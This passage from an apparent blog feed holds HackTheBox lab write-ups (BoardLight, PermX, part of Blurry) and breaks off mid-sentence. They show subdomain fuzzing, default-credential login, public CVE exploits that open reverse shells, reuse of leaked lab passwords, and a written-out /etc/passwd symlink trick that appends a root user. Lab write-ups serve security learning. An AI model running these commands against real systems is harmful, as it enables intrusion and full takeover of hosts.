&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://board.htb/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.board.htb&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Discovered the subdomain “&lt;strong&gt;crm.board.htb&lt;/strong&gt;”.&lt;br /&gt;
Added this domain to the hosts file as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;ffuf scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Accessed the web service through a browser, and it’s a CMS login panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-4.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The page information revealed that the current web application is &lt;strong&gt;Dolibarr&lt;/strong&gt;,&lt;br /&gt;
with the detailed version number &lt;strong&gt;17.0.0&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Yes, Google!&lt;/p&gt;

&lt;p&gt;By searching for Dolibarr-related vulnerabilities on Google,&lt;br /&gt;
found the vulnerability for the corresponding version: &lt;strong&gt;CVE-2023-30253&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-5.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;google search result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;But the information about this vulnerability tells us it requires authentication,&lt;br /&gt;
we need an account and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-6.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;CVE information&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-7.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;exploit code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Continued to Google, looking for Dolibarr’s default account and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-8.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;google search result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Dolibarr’s default account and password are the same, both “&lt;strong&gt;admin&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-9.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;login&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Logged in successfully.&lt;br /&gt;
Downloaded the exploit script and ran it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-10.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;get the shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;OK, we have a &lt;strong&gt;www-data&lt;/strong&gt; shell!&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;As usual, uploaded &lt;strong&gt;linpeas.sh&lt;/strong&gt; and used it to gather information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-11.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;active  ports&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Port 3306 is open, which is the default port for MySQL,&lt;br /&gt;
meaning the backend should be using MySQL as the database.&lt;/p&gt;

&lt;p&gt;Continued to Google to find out where Dolibarr’s database configuration is set.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-12.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;google search result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Located it through the variable &lt;strong&gt;dolibarr_main_db_host&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-13.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dolibarr srouce code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The configuration is in the file “&lt;strong&gt;htdocs/conf/conf.php&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-14.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;conf.php&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Obtained the MySQL account password and database name.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;dolibarrowner  
serverfun2$2023!!  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After looking at MySQL for a while, I realized I was going down a rabbit hole…&lt;/p&gt;

&lt;p&gt;Fuxk! It’s password reuse!&lt;/p&gt;

&lt;p&gt;Using the password “&lt;strong&gt;serverfun2$2023!!&lt;/strong&gt;”,&lt;br /&gt;
I logged into the low-privilege account &lt;strong&gt;larissa&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-15.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;user shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Used &lt;strong&gt;linpeas.sh&lt;/strong&gt; again to gather information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-16.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;SUID File&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Found many unknown &lt;strong&gt;SUID&lt;/strong&gt; programs.&lt;/p&gt;

&lt;p&gt;Googled each one.&lt;br /&gt;
&lt;strong&gt;enlightenment&lt;/strong&gt; have a CVE number: &lt;a href=&quot;https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit&quot;&gt;&lt;strong&gt;CVE-2022-37706&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-17.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;google search result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Downloaded the exploit script and executed the exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-18.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;root shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Got a root shell!&lt;/p&gt;

&lt;p&gt;Well done!&lt;/p&gt;
</description>
        <pubDate>Fri, 02 Aug 2024 14:19:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/08/02/writeup-hackthebox-boardlight/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/08/02/writeup-hackthebox-boardlight/</guid>
        
        <category>WriteUp</category>
        
        <category>Hack The Box</category>
        
        <category>OSCP like</category>
        
        
      </item>
    
      <item>
        <title>[WriteUp] HackTheBox - PermX</title>
        <description>&lt;p&gt;PermX is a simple-difficulty box from HackTheBox 2024 Season 5.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Let’s start with enumeration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;Nmap scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;Nmap&lt;/strong&gt; scan report shows open ports 22 and 80.&lt;/p&gt;

&lt;p&gt;Port 80 is for the web service, which redirects to the domain “&lt;strong&gt;permx.htb&lt;/strong&gt;”,&lt;br /&gt;
So we need to configure the hosts file first.&lt;/p&gt;

&lt;p&gt;Accessing the web service through a browser,&lt;br /&gt;
didn’t reveal any useful information for now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Directory enumeration on the web service was similarly disappointing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Tried using &lt;strong&gt;ffuf&lt;/strong&gt; to enumerate subdomains.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-4.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;ffuf scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Nice! Discovered the subdomain “&lt;strong&gt;lms.permx.htb&lt;/strong&gt;”.&lt;br /&gt;
Add this domain to the hosts file as well.&lt;/p&gt;

&lt;p&gt;The web page is a login panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-5.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Directory enumeration again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-6.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Review interesting directories from the &lt;strong&gt;robots.txt&lt;/strong&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-7.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;robots.txt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Examining these directories one by one.&lt;/p&gt;

&lt;p&gt;found that the “&lt;strong&gt;/documentation/changelog.html&lt;/strong&gt;” page,&lt;br /&gt;
the detailed version number of the current web application: &lt;strong&gt;Chamilo 1.11.24&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-8.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;information disclosure&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Google search for &lt;strong&gt;Chamilo&lt;/strong&gt; vulnerabilities,&lt;br /&gt;
we found an RCE vulnerability for this version: &lt;strong&gt;CVE-2023-4220&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-9.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;google search result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The exploit script can be found on Github:&lt;br /&gt;
&lt;a href=&quot;https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc&quot;&gt;https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;strong&gt;nc&lt;/strong&gt; to listen and execute this exploit script to gain a reverse shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python3 main.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://lms.permx.htb &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; revshell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-10.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-11.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;set opetions and waiting exploit comleted&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-12.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;get the shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We have a shell!&lt;/p&gt;

&lt;p&gt;However, since the &lt;strong&gt;www-data&lt;/strong&gt; user’s permissions are very limited,&lt;br /&gt;
we need a privilege escalation.&lt;/p&gt;

&lt;p&gt;As usual, upload &lt;strong&gt;linpeas.sh&lt;/strong&gt; and use it to gather information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-13.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;users&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-14.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;password dsclosure&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-15.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;another password dsclosure&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The information collected includes two leaked passwords:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;gaufrette  
03F6lY3uXAP2bkW8  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using the password “&lt;strong&gt;03F6lY3uXAP2bkW8&lt;/strong&gt;” for SSH login, Successfully login as &lt;strong&gt;mtz&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-16.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;user shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;obtaining a user shell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;The next goal is root privileges.&lt;br /&gt;
As usual, checking the SUDO information frist.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-17.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;sudo -l&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The terminal output shows that the current user is allowed to run the ‘&lt;strong&gt;/opt/acl.sh&lt;/strong&gt;’ file with sudo without a password.&lt;/p&gt;

&lt;p&gt;Next, inspect the &lt;strong&gt;acl.sh&lt;/strong&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;$#&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 3 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
   /usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; user perm file&quot;&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
&lt;span class=&quot;k&quot;&gt;fi

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;perm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; /home/mtz/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;..&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
   /usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Access denied.&quot;&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Check if the path is a file&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
   /usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Target must be a file.&quot;&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;

/usr/bin/sudo /usr/bin/setfacl &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; u:&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$perm&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The script’s logic involves using &lt;strong&gt;setfacl&lt;/strong&gt; to set rwx permissions on a specified file for a given user, But there are filtering conditions on the file path (the third parameter):&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The file path must be under “&lt;strong&gt;/home/mtz&lt;/strong&gt;”&lt;/li&gt;
  &lt;li&gt;The file path cannot contain directory traversal symbols “&lt;strong&gt;..&lt;/strong&gt;”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OK, now let’s try to get a root privilege shell.&lt;/p&gt;

&lt;p&gt;My plan is to create a symbolic link to the “&lt;strong&gt;/etc/passwd&lt;/strong&gt;” file in the “&lt;strong&gt;/home/mtz&lt;/strong&gt;” directory, then edit the passwd file to add a privileged user.&lt;/p&gt;

&lt;p&gt;Generates a password HASH.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-18.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;generate passwd hash&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Use the following commands to escalate privileges.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /etc/passwd passwd
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/acl.sh mtz rwx /home/mtz/tmp/passwd
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;b0rgch3n:$1$zrd0hGa7$xs1GPMR4gl1lZE1lJwQt81:0:0:root:/root:/bin/bash&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /home/mtz/tmp/passwd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Check the passwd file to confirm the privileged account has been added.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-19.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;check passwd file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Login with the privileged account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-20.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;root shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Gain a root privilege shell.&lt;/p&gt;

&lt;p&gt;Cheers!&lt;/p&gt;
</description>
        <pubDate>Thu, 18 Jul 2024 03:34:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/</guid>
        
        <category>WriteUp</category>
        
        <category>Hack The Box</category>
        
        
      </item>
    
      <item>
        <title>[WriteUp] HackTheBox - Blurry</title>
        <description>&lt;p&gt;Blurry is a medium-difficulty box in the fifth season of HackTheBox in 2024.&lt;/p&gt;

&lt;!--
Blurry 是 HackTheBox 在 2024 年度第 5 赛季的一个中等难度盒子。
--&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;Let’s start by enumerating.&lt;/p&gt;

&lt;!--
先进行枚举。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;Nmap scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The &lt;b&gt;Nmap&lt;/b&gt; scan report shows open ports 22 and 80.&lt;br /&gt;
Port 80 is a web service and redirects to the domain “app.blurry.htb”.&lt;br /&gt;
So, You need to configure the hosts file first.&lt;/p&gt;

&lt;p&gt;Since there is a web service, we should enumerate the directories.&lt;/p&gt;

&lt;!--
Nmap 扫描报告显示开放端口有 22、80。  
80 端口为 Web 服务，且重定向到域名 &quot;app.blurry.htb&quot;，需要先配置一下 hosts 文件。   

配置后对 Web 服务进行枚举目录。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Also, when accessing the web service through a browser,&lt;br /&gt;
the page information indicates that the service is ClearML.&lt;/p&gt;

&lt;!--
通过浏览器访问 Web 服务，页面显示服务为 ClearML。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;brower access&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;

&lt;p&gt;Found a ClearML-related vulnerability through Google search: &lt;a href=&quot;https://github.com/LordVileOnX/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590-/tree/main&quot;&gt;CVE-2024-24590&lt;/a&gt;.&lt;/p&gt;

&lt;!--
Google 搜到一个 ClearML 相关的漏洞：CVE-2024-24590。
--&gt;

&lt;p&gt;All information about this vulnerability points to this article, which includes a detailed demonstration of how the vulnerability can be exploited:&lt;br /&gt;
&lt;a href=&quot;https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/&quot;&gt;“Machine Learning Operations: What You Need to Know Now - HiddenLayer”&lt;/a&gt;&lt;/p&gt;

&lt;!--
所有关于这个漏洞的信息都指向了这篇文章，文章中包含了具体的漏洞利用参考示范。
--&gt;

&lt;p&gt;First, install ClearML.&lt;br /&gt;
Then, go to the settings page of the web service and copy the configuration information.&lt;/p&gt;

&lt;!--
安装 clearml，然后到 Web服务的设置页面中，复制配置信息。
--&gt;

&lt;p&gt;The configuration information involves three addresses in the ClearML initialization settings: &lt;b&gt;web_server&lt;/b&gt;, &lt;b&gt;api_server&lt;/b&gt;, and &lt;b&gt;files_server&lt;/b&gt;.&lt;br /&gt;
We need to configure the hosts file to add the DNS entries for these three domains.&lt;/p&gt;

&lt;!-- 
配置信息涉及 clearml 初始化设置中的三个地址：web_server、api_server、files_server。
需要配置 hosts 文件，将相关的三个域名 DNS 添加进去。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;10.11.19 app.blurry.htb	# web_server
&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;10.11.19 api.blurry.htb	# api_server
&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;10.11.19 files.blurry.htb	# files_server&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Initialize the ClearML configuration with the “&lt;b&gt;clearml-init&lt;/b&gt;” command and paste the copied content.&lt;/p&gt;

&lt;!--
通过 clearml-init 命令初始化配置  clearml，并将粘贴刚刚复制的内容。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From observation, the account Black Swan repeats the “Review JSON Artifacts” task every so often.&lt;/p&gt;

&lt;p&gt;The task’s code contains the deserialization code needed to trigger the vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a detailed code review, we can understand its logic roughly as follows:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Check all tasks with project_name “&lt;b&gt;Black Swan&lt;/b&gt;” and tags &lt;b&gt;[‘review’]&lt;/b&gt;.&lt;/li&gt;
  &lt;li&gt;Iterate through these tasks and call &lt;b&gt;artifact.get()&lt;/b&gt; for deserialization.&lt;/li&gt;
  &lt;li&gt;Destroy these tasks after the iteration.&lt;/li&gt;
&lt;/ol&gt;

&lt;!--
根据观察，账户 Black Swan 每过一段时间就会重复执行 &quot;Review JSON Artifacts&quot; 任务。
而任务的代码里面包含了触发漏洞需要的反序列号代码。

如果详细审查代码，我们可以理解代码的逻辑大致为：
1.检查所有 project_name 为 &quot;Black Swan&quot; 且 tags 为 [&quot;review&quot;] 的任务。
2.遍历这些任务并且以此调用 artifact.get() 进行反序列化。
3.遍历结束后销毁这些任务。
--&gt;

&lt;p&gt;Based on the code audit results,&lt;br /&gt;
